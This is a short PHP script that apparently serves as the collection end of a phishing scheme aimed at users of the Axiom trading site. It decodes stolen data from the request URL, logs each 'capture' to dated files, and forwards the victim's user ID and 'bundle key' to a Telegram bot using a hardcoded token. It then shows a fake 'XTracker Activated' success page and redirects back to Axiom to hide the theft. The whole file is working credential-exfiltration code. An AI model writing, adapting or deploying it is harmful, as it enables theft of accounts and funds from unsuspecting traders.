<?php
$path = $_SERVER['REQUEST_URI'];
preg_match('/\/data\/(.+)/', $path, $matches);
$base64 = $matches[1] ?? '';

$data = json_decode(base64_decode($base64), true);

if ($data) {
    // Log to file
    $log = date('Y-m-d H:i:s') . " | New Capture\n" . json_encode($data, JSON_PRETTY_PRINT) . "\n\n";
    file_put_contents('../logs/captures_' . date('Y-m-d') . '.txt', $log, FILE_APPEND);

    // Send Telegram Notification
    $botToken = "8523306990:AAEIXf_oDXg2bIiVodkHtPgq8NipLyqpMBU";   // ← Replace with your real token
    $chatId   = "8000848286";

    $message = "🟢 **New XTracker Capture**\n\n" .
               "⏰ Time: " . date('Y-m-d H:i:s') . "\n" .
               "👤 User ID: " . ($data['user']['id'] ?? 'N/A') . "\n" .
               "🔑 Bundle Key: " . ($data['bundleKey'] ?? 'None');

    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message) . "&parse_mode=Markdown");
}

// Fake success page
echo "<h1 style='color:lime;text-align:center;margin-top:80px;font-family:sans-serif;'>✅ XTracker Activated Successfully!</h1>";
echo "<p style='text-align:center;'>Redirecting back to Axiom...</p>";
echo "<script>setTimeout(()=>{window.location='https://axiom.trade/discover';}, 2500);</script>";
?>